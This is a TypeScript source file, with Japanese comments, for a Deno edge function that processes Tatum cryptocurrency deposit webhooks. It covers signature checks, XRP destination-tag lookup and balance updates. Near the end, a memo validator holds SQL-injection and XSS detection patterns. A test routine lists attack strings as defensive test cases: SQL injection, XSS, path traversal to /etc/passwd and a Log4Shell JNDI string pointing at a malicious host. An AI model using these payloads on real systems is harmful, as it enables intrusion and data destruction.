// Tatum Webhook Edge Function - 完全修正版 v3.0.0
// 本番運用対応：完全な入金処理フロー + XRP共有アドレス対応

// @ts-expect-error Deno runtime import
import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
// @ts-expect-error Deno std utils
import { timingSafeEqual } from "https://deno.land/std@0.168.0/crypto/timing_safe_equal.ts";

// モジュールインポート
import type {
  TatumWebhookPayload,
  NormalizedEvent,
  LogContext,
  EnvironmentConfig,
  WebhookProcessingResult,
  SecureDepositAddress,
  MemoValidationResult,
  SecureQueryResult
} from './types.ts';
import {
  validateEnvironment,
  logConfigSummary,
  SERVICE_NAME,
  SERVICE_VERSION,
  ENVIRONMENT
} from './config.ts';
import { Logger, createLogContext, generateCorrelationId, extractRequestInfo } from './logger.ts';
import { MetricsCollector } from './metrics.ts';
import { DistributedRateLimiter } from './rate-limiter.ts';
import { HealthChecker } from './health-checker.ts';
import { DeadLetterQueue } from './dead-letter-queue.ts';

// @ts-expect-error Supabase JS (esm) for Deno
import { createClient, SupabaseClient } from "https://esm.sh/@supabase/supabase-js@2";

/**
 * 修正されたTatum Webhook処理メインクラス
 * 完全な入金処理フロー + XRP共有アドレス対応
 */
class TatumWebhookHandler {
  private config: EnvironmentConfig;
  private supabase: SupabaseClient;
  private logger: Logger;
  private metrics: MetricsCollector;
  private rateLimiter: DistributedRateLimiter;
  private healthChecker: HealthChecker;
  private deadLetterQueue: DeadLetterQueue;

  constructor() {
    // 環境設定の初期化と検証
    this.config = validateEnvironment();
    logConfigSummary(this.config);

    // Supabaseクライアント初期化
    this.supabase = createClient(this.config.supabaseUrl, this.config.supabaseServiceRoleKey);

    // コアモジュール初期化
    this.logger = new Logger(this.config.logLevel, this.config.enableAuditLogging);
    this.metrics = new MetricsCollector(this.config.enableMetrics);
    this.rateLimiter = new DistributedRateLimiter(
      this.config.enableDistributedRateLimit,
      this.config.denokv?.url
    );
    this.healthChecker = new HealthChecker(this.config);
    this.deadLetterQueue = new DeadLetterQueue(this.config.supabaseUrl, this.config.supabaseServiceRoleKey);

    // 依存関係の設定
    this.rateLimiter.setLogger(this.logger);
    this.healthChecker.setDependencies(this.logger, this.metrics, this.rateLimiter);
    this.deadLetterQueue.setDependencies(this.logger, this.metrics);

    console.log(JSON.stringify({
      level: 'INFO',
      message: 'Tatum Webhook Handler初期化完了（完全修正版v3.0.0）',
      service: SERVICE_NAME,
      version: SERVICE_VERSION,
      environment: ENVIRONMENT,
      timestamp: new Date().toISOString(),
    }));
  }

  /**
   * メインのリクエストハンドラー（既存のまま）
   */
  async handleRequest(request: Request): Promise<Response> {
    const correlationId = generateCorrelationId();
    const context = createLogContext(correlationId);
    const requestInfo = extractRequestInfo(request);

    const startTime = Date.now();
    let response: Response | undefined;

    try {
      // ヘルスチェックエンドポイント
      if (request.method === 'GET') {
        const url = new URL(request.url);
        if (url.pathname.endsWith('/health')) {
          return await this.healthChecker.handleHealthCheck();
        }
      }

      // POSTリクエストのみ処理
      if (request.method !== 'POST') {
        response = new Response('Method not allowed', { status: 405 });
        return response;
      }

      // レート制限チェック
      const clientId = requestInfo.clientIp;
      const isAllowed = await this.rateLimiter.isAllowed(clientId, context);

      if (!isAllowed) {
        this.metrics.increment('webhook.rate_limit_exceeded', { client: clientId.substring(0, 8) });

        await this.logger.auditLog({
          event: 'rate_limit_exceeded',
          ...context,
          resource: `client:${clientId}`,
          details: { requestInfo },
        });

        response = new Response('Rate limit exceeded', { status: 429 });
        return response;
      }

      // Webhookイベント処理
      response = await this.processWebhook(request, context);
      return response;

    } catch (error) {
      // 予期しないエラーの処理
      response = await this.handleUnexpectedError(error, context);
      return response;

    } finally {
      // リクエスト処理完了の記録
      const duration = Date.now() - startTime;
      this.metrics.timing('webhook.request_duration', duration);
      this.metrics.increment('webhook.requests_total', {
        method: request.method,
        status: response ? String(response.status) : 'unknown',
      });

      if (response) {
        this.logger.info('リクエスト処理完了', context, {
          duration,
          status: response.status,
          method: request.method,
          requestInfo,
        });
      }

      // システムメトリクスの定期記録
      if (Math.random() < 0.1) { // 10%の確率で実行
        this.metrics.recordSystemMetrics();
      }
    }
  }

  /**
   * Webhookイベント処理（既存のまま）
   */
  private async processWebhook(request: Request, context: LogContext): Promise<Response> {
    // Request bodyとpayloadのキャッシュ（DLQ用）
    let cachedBody: string | null = null;
    let cachedPayload: Record<string, unknown> | null = null;

    try {
      // リクエストボディの取得
      const body = await request.text();
      cachedBody = body; // DLQ用にキャッシュ

      if (!body) {
        throw new Error('空のリクエストボディ');
      }

      // 署名検証（設定されている場合）
      if (this.config.tatumWebhookSecret) {
        await this.verifyWebhookSignature(request, body);
      }

      // JSONパース
      let payload: TatumWebhookPayload;
      try {
        payload = JSON.parse(body);
        cachedPayload = payload; // DLQ用にキャッシュ
      } catch (parseError) {
        // JSONパースエラー時もbodyをキャッシュしておく
        cachedPayload = { rawBody: body, parseError: parseError instanceof Error ? parseError.message : 'Unknown parse error' };
        throw new Error(`JSONパースエラー: ${parseError instanceof Error ? parseError.message : 'Unknown error'}`);
      }

      this.logger.info('Webhookイベント受信', context, {
        eventType: payload.type || payload.subscriptionType,
        hasData: !!payload.data,
        dataKeys: payload.data ? Object.keys(payload.data).join(',') : 'none'
      });

      // イベント処理
      const result = await this.processWebhookEvent(payload, context);

      this.metrics.increment('webhook.events_processed', {
        type: payload.type || 'unknown',
        success: String(result.success),
      });

      // 成功レスポンス
      return new Response(JSON.stringify({
        success: true,
        processed: result.eventsProcessed,
        correlationId: context.correlationId,
      }), {
        status: 200,
        headers: { 'Content-Type': 'application/json' },
      });

    } catch (error) {
      // Webhookイベント処理エラー
      // デッドレターキューに保存（キャッシュされたpayloadを使用）
      const payloadForDLQ = cachedPayload || {
        error: 'Request payload could not be parsed or cached',
        rawBody: cachedBody || 'Body not available',
        errorType: 'request_processing_failure'
      };

      await this.deadLetterQueue.saveFailedEvent(
        context.correlationId,
        payloadForDLQ,
        error as Error,
        context
      );

      this.logger.error('Webhookイベント処理エラー', context, error as Error, {
        saved_to_dead_letter_queue: true,
      });

      this.metrics.increment('webhook.events_failed');

      return new Response(JSON.stringify({
        error: 'Webhook processing failed',
        correlationId: context.correlationId,
      }), {
        status: 500,
        headers: { 'Content-Type': 'application/json' },
      });
    }
  }

  /**
   * Webhook署名検証（既存のまま）
   */
  private async verifyWebhookSignature(request: Request, body: string): Promise<void> {
    const signature = request.headers.get('x-tatum-signature') || request.headers.get('signature');

    if (!signature) {
      throw new Error('Webhook署名が見つかりません');
    }

    if (!this.config.tatumWebhookSecret) {
      throw new Error('Webhook署名検証の設定がありません');
    }

    // HMAC-SHA512による署名検証
    const encoder = new TextEncoder();
    const key = await crypto.subtle.importKey(
      'raw',
      encoder.encode(this.config.tatumWebhookSecret),
      { name: 'HMAC', hash: 'SHA-512' },
      false,
      ['sign']
    );

    const expectedSignature = await crypto.subtle.sign('HMAC', key, encoder.encode(body));
    const expectedHex = Array.from(new Uint8Array(expectedSignature))
      .map(b => b.toString(16).padStart(2, '0'))
      .join('');

    const providedSignature = signature.replace(/^sha512=/, '');

    const isValid = providedSignature.length === expectedHex.length &&
      timingSafeEqual(
        encoder.encode(providedSignature),
        encoder.encode(expectedHex)
      );

    if (!isValid) {
      throw new Error('無効なWebhook署名');
    }
  }

  /**
   * Webhookイベント処理の実装（既存のまま）
   */
  private async processWebhookEvent(
    payload: TatumWebhookPayload,
    context: LogContext
  ): Promise<WebhookProcessingResult> {
    const result: WebhookProcessingResult = {
      success: true,
      eventsProcessed: 0,
      eventsSkipped: 0,
      eventsFailed: 0,
      processingTimeMs: 0,
      errors: [],
    };

    const startTime = Date.now();

    try {
      // イベントタイプに基づく処理分岐
      switch (payload.type || payload.subscriptionType) {
        case 'ADDRESS_TRANSACTION':
        case 'INCOMING_NATIVE_TX':
        case 'INCOMING_FUNGIBLE_TX':
          await this.processIncomingTransaction(payload, context);
          result.eventsProcessed++;
          break;

        case 'OUTGOING_NATIVE_TX':
        case 'OUTGOING_FUNGIBLE_TX':
          await this.processOutgoingTransaction(payload, context);
          result.eventsProcessed++;
          break;

        case 'FAILED_TXS_PER_BLOCK':
          await this.processFailedTransaction(payload, context);
          result.eventsProcessed++;
          break;

        default:
          this.logger.warn('未対応のイベントタイプ', context, {
            eventType: payload.type || payload.subscriptionType,
            payload
          });
          result.eventsSkipped++;
      }

    } catch (processingError) {
      result.success = false;
      result.eventsFailed++;
      result.errors.push(processingError instanceof Error ? processingError.message : String(processingError));

      throw processingError;
    } finally {
      result.processingTimeMs = Date.now() - startTime;
    }

    return result;
  }

  /**
   * =====================================================
   * 🚀 完全修正版：入金トランザクション処理
   * =====================================================
   * Phase2対応：deposit_transactions + deposits + user_assets
   * XRP共有アドレス対応：destination_tag/memo考慮検索
   */
  private async processIncomingTransaction(payload: TatumWebhookPayload, context: LogContext): Promise<void> {
    this.logger.info('入金トランザクション処理開始（完全修正版）', context, { payload });

    const normalized = this.normalizeTransactionEvent(payload);
    if (!normalized) {
      throw new Error('トランザクション正規化に失敗');
    }

    // ステップ1: 高度なユーザー検索（XRP共有アドレス対応）
    const depositAddress = await this.findDepositAddressWithMemoSupport(normalized, context);
    if (!depositAddress) {
      this.logger.warn('未登録のアドレス・メモ組み合わせへのトランザクション', context, {
        address: normalized.address,
        memo: normalized.memo,
        destinationTag: normalized.memo, // XRP用
        normalized
      });
      return;
    }

    // ステップ2: 重複チェック（複数テーブルで確認）
    const isDuplicate = await this.checkDuplicateTransaction(normalized, depositAddress.user_id, context);
    if (isDuplicate) {
      this.logger.debug('重複トランザクションをスキップ', context, {
        transactionHash: normalized.transactionHash,
        userId: depositAddress.user_id
      });
      return;
    }

    // ステップ3: 3段階アトミック処理の実行
    try {
      await this.executeCompleteDepositFlow(normalized, depositAddress, context);

      this.logger.info('入金処理完了', context, {
        transactionHash: normalized.transactionHash,
        userId: depositAddress.user_id,
        amount: normalized.amount,
        asset: normalized.asset || depositAddress.asset
      });

    } catch (error) {
      this.logger.error('入金処理中にエラー発生', context, error as Error, {
        transactionHash: normalized.transactionHash,
        userId: depositAddress.user_id,
        step: 'atomic_processing'
      });
      throw error;
    }

    // ステップ4: 監査ログとメトリクス
    await this.logger.auditLog({
      event: 'deposit_transaction_processed_v3',
      ...context,
      userId: depositAddress.user_id,
      resource: `transaction:${normalized.transactionHash}`,
      details: { normalized, depositAddress },
    });

    this.metrics.increment('deposit.transaction_processed_v3', {
      chain: normalized.chain || 'unknown',
      asset: normalized.asset || 'unknown',
      status: normalized.confirmations >= this.getRequiredConfirmations(normalized.chain) ? 'confirmed' : 'pending',
      has_memo: normalized.memo ? 'true' : 'false'
    });
  }

  /**
   * XRP等共有アドレス対応のユーザー検索
   * destination_tag/memo考慮で適切なユーザーを特定
   */
  private async findDepositAddressWithMemoSupport(
    normalized: NormalizedEvent,
    context: LogContext
  ): Promise<SecureDepositAddress | null> {
    try {
      const query = this.supabase
        .from('deposit_addresses')
        .select('user_id, asset, chain, network')
        .eq('address', normalized.address)
        .eq('active', true);

      // XRPや他のメモ対応チェーンの場合
      if (normalized.memo) {
        // 入力検証：memoの安全性チェック
        const memoValidation = this.validateMemoForFinancialSystem(
          normalized.memo,
          normalized.chain,
          context
        );
        if (memoValidation.isValid && memoValidation.sanitizedValue) {
          // 完全に安全なSupabase複数条件検索
          // destination_tagまたはmemoのいずれかでマッチ
          const destinationTagQuery = this.supabase
            .from('deposit_addresses')
            .select('user_id, asset, chain, network')
            .eq('address', normalized.address)
            .eq('active', true)
            .eq('destination_tag', memoValidation.sanitizedValue);

          const memoQuery = this.supabase
            .from('deposit_addresses')
            .select('user_id, asset, chain, network')
            .eq('address', normalized.address)
            .eq('active', true)
            .eq('memo', memoValidation.sanitizedValue);

          // 両方のクエリを実行して結果をマージ
          const [destTagResult, memoResult] = await Promise.all([
            destinationTagQuery,
            memoQuery
          ]);

          const allResults = [
            ...(destTagResult.data || []),
            ...(memoResult.data || [])
          ];

          // 重複を除去
          const uniqueResults = allResults.filter((addr, index, self) =>
            index === self.findIndex(a => a.user_id === addr.user_id)
          );

          if (uniqueResults.length > 0) {
            return uniqueResults[0];
          }
        }
      }

      const { data: depositAddresses, error } = await query;

      if (error) {
        throw new Error(`ユーザー検索エラー: ${error.message}`);
      }

      if (!depositAddresses || depositAddresses.length === 0) {
        return null;
      }

      // 複数マッチした場合の処理
      if (depositAddresses.length > 1) {
        this.logger.warn('複数のアドレスがマッチ', context, {
          address: normalized.address,
          memo: normalized.memo,
          matchCount: depositAddresses.length,
          matches: depositAddresses
        });

        // メモ完全一致を優先
        if (normalized.memo) {
          const exactMatch = depositAddresses.find(addr =>
            (addr as { destination_tag?: string }).destination_tag === normalized.memo ||
            (addr as { memo?: string }).memo === normalized.memo
          );
          if (exactMatch) {
            return exactMatch as SecureDepositAddress;
          }
        }

        // フォールバック：最初のマッチを使用（本番では要検討）
        this.logger.warn('複数マッチのため最初のレコードを使用', context, {
          selectedUserId: depositAddresses[0].user_id
        });
      }

      return depositAddresses[0] as SecureDepositAddress;

    } catch (error) {
      this.logger.error('ユーザー検索中にエラー', context, error as Error, {
        address: normalized.address,
        memo: normalized.memo
      });
      throw error;
    }
  }

  /**
   * 重複チェック（deposit_transactions と deposits 両方）
   */
  private async checkDuplicateTransaction(
    normalized: NormalizedEvent,
    userId: string,
    context: LogContext
  ): Promise<boolean> {
    try {
      // deposit_transactions テーブルでの重複チェック
      const { data: existingTx } = await this.supabase
        .from('deposit_transactions')
        .select('id')
        .eq('user_id', userId)
        .eq('transaction_hash', normalized.transactionHash)
        .eq('to_address', normalized.address)
        // メモがある場合はそれもチェック
        .eq('destination_tag', normalized.memo || null)
        .maybeSingle();

      if (existingTx) {
        return true;
      }

      // deposits テーブルでの重複チェック（レガシー対応）
      const { data: existingDeposit } = await this.supabase
        .from('deposits')
        .select('id')
        .eq('user_id', userId)
        .eq('transaction_hash', normalized.transactionHash)
        .maybeSingle();

      return !!existingDeposit;

    } catch (error) {
      this.logger.error('重複チェック中にエラー', context, error as Error);
      throw error;
    }
  }

  /**
   * 3段階完全入金処理フローの実行
   * 1. deposit_transactions への記録
   * 2. deposits への記録
   * 3. user_assets の残高更新
   */
  private async executeCompleteDepositFlow(
    normalized: NormalizedEvent,
    depositAddress: { user_id: string; asset: string; chain: string; network: string },
    context: LogContext
  ): Promise<void> {
    const requiredConfirmations = this.getRequiredConfirmations(normalized.chain);
    const isConfirmed = normalized.confirmations >= requiredConfirmations;
    const status = isConfirmed ? 'confirmed' : 'pending';

    try {
      // ステップ1: deposit_transactions への詳細記録
      const { data: depositTransaction, error: dtError } = await this.supabase
        .from('deposit_transactions')
        .insert({
          user_id: depositAddress.user_id,
          chain: normalized.chain || depositAddress.chain,
          network: normalized.network || depositAddress.network,
          asset: normalized.asset || depositAddress.asset,
          transaction_hash: normalized.transactionHash,
          block_number: normalized.blockNumber,
          from_address: normalized.fromAddress || 'unknown',
          to_address: normalized.address,
          amount: normalized.amount,
          confirmations: normalized.confirmations,
          required_confirmations: requiredConfirmations,
          status,
          destination_tag: normalized.memo || null,
          memo: normalized.memo || null,
          detected_at: new Date().toISOString(),
          confirmed_at: isConfirmed ? new Date().toISOString() : null,
          processed_at: new Date().toISOString(),
          raw_transaction: normalized.raw || null,
        })
        .select('id')
        .single();

      if (dtError) {
        throw new Error(`deposit_transactions作成エラー: ${dtError.message}`);
      }

      // ステップ2: deposits への基本記録（レガシー互換性）
      const { error: depositsError } = await this.supabase
        .from('deposits')
        .insert({
          user_id: depositAddress.user_id,
          amount: normalized.amount,
          currency: normalized.asset || depositAddress.asset,
          chain: normalized.chain || depositAddress.chain,
          network: normalized.network || depositAddress.network,
          status,
          transaction_hash: normalized.transactionHash,
          wallet_address: normalized.address,
          confirmations_required: requiredConfirmations,
          confirmations_observed: normalized.confirmations,
          confirmed_at: isConfirmed ? new Date().toISOString() : null,
          memo_tag: normalized.memo || null,
        });

      if (depositsError) {
        throw new Error(`deposits作成エラー: ${depositsError.message}`);
      }

      // ステップ3: user_assets残高更新（確認済みの場合のみ）
      if (isConfirmed) {
        const { error: assetsError } = await this.supabase.rpc('upsert_user_asset', {
          p_user_id: depositAddress.user_id,
          p_currency: normalized.asset || depositAddress.asset,
          p_amount: normalized.amount
        });

        if (assetsError) {
          throw new Error(`user_assets更新エラー: ${assetsError.message}`);
        }

        this.logger.info('残高更新完了', context, {
          userId: depositAddress.user_id,
          currency: normalized.asset || depositAddress.asset,
          amount: normalized.amount
        });
      } else {
        this.logger.info('未確認のため残高更新をスキップ', context, {
          confirmations: normalized.confirmations,
          required: requiredConfirmations
        });
      }

    } catch (error) {
      this.logger.error('完全入金処理フロー中にエラー', context, error as Error, {
        userId: depositAddress.user_id,
        transactionHash: normalized.transactionHash
      });
      throw error;
    }
  }

  /**
   * 出金トランザクション処理（既存のまま）
   */
  private async processOutgoingTransaction(payload: TatumWebhookPayload, context: LogContext): Promise<void> {
    this.logger.info('出金トランザクション処理開始', context, { payload });

    const normalized = this.normalizeTransactionEvent(payload);
    if (!normalized) {
      throw new Error('出金トランザクション正規化に失敗');
    }

    // 出金リクエストの更新処理などを実装
    // 現在は基本的なログ記録のみ
    this.metrics.increment('withdrawal.transaction_processed', {
      chain: normalized.chain || 'unknown',
    });
  }

  /**
   * 失敗トランザクション処理（既存のまま）
   */
  private async processFailedTransaction(payload: TatumWebhookPayload, context: LogContext): Promise<void> {
    this.logger.warn('失敗トランザクション検出', context, { payload });

    this.metrics.increment('transaction.failed_detected');
  }

  /**
   * トランザクションイベント正規化（memo/destination_tag対応強化）
   */
  private normalizeTransactionEvent(payload: TatumWebhookPayload): NormalizedEvent | null {
    try {
      const data = payload.data as Record<string, unknown> | null;
      if (!data) return null;

      // unknown型プロパティの安全な型キャスト
      const safeString = (value: unknown): string | undefined => 
        typeof value === 'string' ? value : undefined;
      const safeNumber = (value: unknown): number | undefined => 
        typeof value === 'number' ? value : undefined;
      
      // 必須フィールドの安全な取得
      const address = safeString(data.address) || safeString(data.to) || '';
      const transactionHash = safeString(data.txId) || safeString(data.hash) || safeString(data.transactionHash) || '';
      
      return {
        address,
        chain: safeString(data.chain) || this.inferChainFromPayload(payload),
        network: safeString(data.network),
        asset: safeString(data.asset) || safeString(data.currency),
        amount: parseFloat(safeString(data.amount) || '0'),
        rawAmount: safeString(data.amount) || '0',
        transactionHash,
        fromAddress: safeString(data.from),
        counterAddress: safeString(data.counterAddress),
        memo: safeString(data.memo) || safeString(data.tag) || safeString(data.destinationTag) || safeString(data.destination_tag), // 複数フィールド対応
        confirmations: parseInt(safeString(data.confirmations) || '0'),
        blockNumber: safeNumber(data.blockNumber),
        tokenAddress: safeString(data.tokenAddress),
        raw: data,
      };
    } catch (error) {
      this.logger.error('トランザクション正規化エラー', {
        correlationId: generateCorrelationId(),
        timestamp: new Date().toISOString(),
        service: SERVICE_NAME,
        version: SERVICE_VERSION,
        environment: ENVIRONMENT,
      }, error as Error, { payload });
      return null;
    }
  }

  /**
   * チェーン推定（既存のまま）
   */
  private inferChainFromPayload(payload: TatumWebhookPayload): string | undefined {
    const type = payload.type || payload.subscriptionType || '';

    if (type.includes('BTC') || type.includes('BITCOIN')) return 'bitcoin';
    if (type.includes('ETH') || type.includes('ETHEREUM')) return 'ethereum';
    if (type.includes('TRON') || type.includes('TRX')) return 'tron';
    if (type.includes('XRP') || type.includes('RIPPLE')) return 'xrp';

    return undefined;
  }

  /**
   * 必要確認数取得（既存のまま）
   */
  private getRequiredConfirmations(chain?: string): number {
    const confirmations: Record<string, number> = {
      bitcoin: 3,
      btc: 3,
      ethereum: 12,
      eth: 12,
      tron: 19,
      trx: 19,
      xrp: 1,
    };

    return confirmations[chain?.toLowerCase() || ''] || 12;
  }

  /**
   * リクエストペイロードの安全な取得（非推奨）
   * @deprecated Request bodyの重複読み取り問題のため使用非推奨。
   * processWebhook()内のキャッシュ機能を使用してください。
   */
  private async parseRequestPayloadSafely(request: Request): Promise<Record<string, unknown>> {
    try {
      const body = await request.text();
      return JSON.parse(body);
    } catch {
      return { error: 'Failed to parse request payload' };
    }
  }

  /**
   * 予期しないエラーハンドリング（既存のまま）
   */
  private async handleUnexpectedError(error: unknown, context: LogContext): Promise<Response> {
    this.logger.critical('予期しないシステムエラー', context, error as Error);
    this.metrics.increment('system.unexpected_errors');

    return new Response(JSON.stringify({
      error: 'Internal server error',
      correlationId: context.correlationId,
    }), {
      status: 500,
      headers: { 'Content-Type': 'application/json' },
    });
  }

  /**
   * memoフィールドの入力検証とサニタイゼーション
   * SQLインジェクション攻撃を防ぐためのセキュリティ対策
   */
  /**
   * 金融システム基準の強化されたMemo検証
   * ゼロトレランス: SQLインジェクション攻撃の完全防止
   */
  private validateMemoForFinancialSystem(
    memo: string,
    chain?: string,
    context?: LogContext
  ): MemoValidationResult {
    // セキュリティ監査ログ開始（型安全性強化）
    const defaultContext: LogContext = {
      correlationId: context?.correlationId || `memo-validation-${Date.now()}-${Math.random().toString(36).substring(2)}`,
      timestamp: context?.timestamp || new Date().toISOString(),
      service: context?.service || SERVICE_NAME,
      version: context?.version || SERVICE_VERSION,
      environment: context?.environment || ENVIRONMENT
    };

    const auditContext: LogContext = {
      ...defaultContext,
      ...context, // 既存のcontextで上書き
      function: 'validateMemoForFinancialSystem',
      input_memo_length: memo?.length || 0,
      chain: chain || 'unknown'
    } as LogContext & { function: string; input_memo_length: number; chain: string };

    try {
      // 厳格な型安全性チェック
      if (typeof memo !== 'string') {
        this.logger.warn('Memo型検証失敗: 文字列以外', auditContext, {
          received_type: typeof memo,
          security_risk: 'high'
        });
        return {
          isValid: false,
          sanitizedValue: null,
          securityRisk: 'high',
          rejectionReason: 'Invalid type: expected string'
        };
      }

      // null/undefined/空文字チェック
      if (!memo || memo.length === 0) {
        return {
          isValid: false,
          sanitizedValue: null,
          securityRisk: 'none',
          rejectionReason: 'Empty memo'
        };
      }

      // チェーン固有の検証ルール
      if (chain === 'XRP' || chain === 'xrp') {
        return this.validateXRPDestinationTag(memo, auditContext);
      } else {
        return this.validateGenericMemo(memo, auditContext);
      }

    } catch (error) {
      this.logger.error('Memo検証中にエラー', auditContext, error as Error);
      return {
        isValid: false,
        sanitizedValue: null,
        securityRisk: 'high',
        rejectionReason: 'Validation error'
      };
    }
  }

  /**
   * XRP Destination Tag専用検証（数値のみ、0-4294967295）
   */
  private validateXRPDestinationTag(tag: string, context: LogContext): MemoValidationResult {
    // 数値のみ許可
    const numericPattern = /^\d+$/;
    if (!numericPattern.test(tag)) {
      this.logger.warn('XRP DestinationTag検証失敗: 数値以外', context, {
        tag,
        security_risk: 'medium'
      });
      return {
        isValid: false,
        sanitizedValue: null,
        securityRisk: 'medium',
        rejectionReason: 'XRP destination tag must be numeric'
      };
    }

    // 範囲チェック（32bit符号なし整数）
    const numericValue = parseInt(tag, 10);
    if (numericValue < 0 || numericValue > 4294967295) {
      this.logger.warn('XRP DestinationTag範囲外', context, {
        tag,
        numeric_value: numericValue,
        security_risk: 'medium'
      });
      return {
        isValid: false,
        sanitizedValue: null,
        securityRisk: 'medium',
        rejectionReason: 'XRP destination tag out of range (0-4294967295)'
      };
    }

    // 長さ制限（最大10桁）
    if (tag.length > 10) {
      return {
        isValid: false,
        sanitizedValue: null,
        securityRisk: 'medium',
        rejectionReason: 'XRP destination tag too long'
      };
    }

    return {
      isValid: true,
      sanitizedValue: tag,
      securityRisk: 'none'
    };
  }

  /**
   * 汎用Memo検証（英数字のみ、最大32文字）
   */
  private validateGenericMemo(memo: string, context: LogContext): MemoValidationResult {
    // 長さ制限（金融システム標準：32文字以下）
    if (memo.length > 32) {
      this.logger.warn('Memo長さ制限超過', context, {
        memo_length: memo.length,
        security_risk: 'low'
      });
      return {
        isValid: false,
        sanitizedValue: null,
        securityRisk: 'low',
        rejectionReason: 'Memo too long (max 32 characters)'
      };
    }

    // 厳格な文字セット制限（英数字のみ）
    const strictPattern = /^[a-zA-Z0-9]+$/;
    if (!strictPattern.test(memo)) {
      this.logger.warn('Memo文字セット検証失敗', context, {
        memo,
        security_risk: 'high'
      });
      return {
        isValid: false,
        sanitizedValue: null,
        securityRisk: 'high',
        rejectionReason: 'Invalid characters: only alphanumeric allowed'
      };
    }

    // SQLインジェクション攻撃パターンの検出
    const sqlInjectionPatterns = [
      /('|(--)|[;|*%])/i,
      /(union|select|insert|update|delete|drop|create|alter|exec|execute)/i,
      /(script|javascript|vbscript|onload|onerror)/i,
      /[<>&"]/
    ];

    for (const pattern of sqlInjectionPatterns) {
      if (pattern.test(memo)) {
        this.logger.error('SQLインジェクション攻撃パターン検出', context, undefined, {
          memo,
          pattern: pattern.toString(),
          security_risk: 'critical'
        });
        return {
          isValid: false,
          sanitizedValue: null,
          securityRisk: 'high',
          rejectionReason: 'Security violation: potential injection attack'
        };
      }
    }

    return {
      isValid: true,
      sanitizedValue: memo,
      securityRisk: 'none'
    };
  }

  /**
   * セキュリティテスト：SQLインジェクション攻撃パターンの検証
   * 本番環境では削除推奨（開発・テスト用）
   */
  private async runSecurityValidationTests(context: LogContext): Promise<void> {
    const testCases = [
      // SQLインジェクション攻撃パターン
      "'; DROP TABLE users; --",
      "1' OR '1'='1",
      "admin'--",
      "' UNION SELECT * FROM users--",
      "1; DELETE FROM deposits;",
      // XSS攻撃パターン
      "<script>alert('XSS')</script>",
      "javascript:alert(1)",
      // その他の悪意のあるパターン
      "../../etc/passwd",
      "\x00\x1f\x7f",
      "${jndi:ldap://malicious.com/}"
    ];

    this.logger.info('セキュリティテスト開始：悪意のあるMemoパターンの検証', context);

    for (const testCase of testCases) {
      const result = this.validateMemoForFinancialSystem(testCase, 'test', context);

      if (result.isValid) {
        this.logger.error('セキュリティテスト失敗：悪意のあるパターンが通過', context, undefined, {
          test_case: testCase,
          security_risk: 'critical'
        });
        throw new Error(`セキュリティテスト失敗：${testCase}`);
      } else {
        this.logger.debug('セキュリティテスト成功：攻撃パターンを正常にブロック', context, {
          test_case: testCase.substring(0, 20) + '...',
          security_risk: result.securityRisk,
          rejection_reason: result.rejectionReason
        });
      }
    }

    this.logger.info('セキュリティテスト完了：全ての攻撃パターンを正常にブロック', context);
  }

  /**
   * システム終了時のクリーンアップ（既存のまま）
   */
  async cleanup(): Promise<void> {
    await Promise.allSettled([
      this.metrics.cleanup(),
      this.rateLimiter.cleanup(),
      this.deadLetterQueue.cleanup(),
    ]);

    console.log('システムクリーンアップ完了');
  }
}

// グローバルハンドラーインスタンス
let webhookHandler: TatumWebhookHandler;

/**
 * Deno Edge Functionエントリーポイント
 */
serve(async (request: Request) => {
  // 初回リクエスト時にハンドラー初期化
  if (!webhookHandler) {
    try {
      webhookHandler = new TatumWebhookHandler();
    } catch (initError) {
      console.error('Webhook Handler初期化エラー:', initError);
      return new Response('Service initialization failed', { status: 503 });
    }
  }

  return await webhookHandler.handleRequest(request);
});

// プロセス終了時のクリーンアップ
globalThis.addEventListener('beforeunload', async () => {
  if (webhookHandler) {
    await webhookHandler.cleanup();
  }
});